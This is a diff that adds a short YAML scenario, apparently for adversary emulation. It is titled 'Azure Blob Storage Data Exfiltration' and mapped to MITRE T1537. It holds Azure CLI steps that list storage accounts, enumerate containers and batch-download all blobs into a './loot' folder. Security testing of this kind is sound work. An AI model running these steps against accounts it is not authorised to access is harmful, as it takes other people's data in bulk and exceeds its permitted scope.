@@ -1,0 +1,11 @@
+name: Azure Blob Storage Data Exfiltration
+description: Gains access to blob containers and downloads all objects.
+mitre_technique: T1537
+stage: Collection
+steps:
+  - action: az storage account list --query "[].{Name:name, ID:id}"
+    description: List all storage accounts
+  - action: az storage container list --account-name <account-name>
+    description: Enumerate blob containers
+  - action: az storage blob download-batch --destination ./loot --source <container-name> --account-name <account-name>
+    description: Download all blobs from container
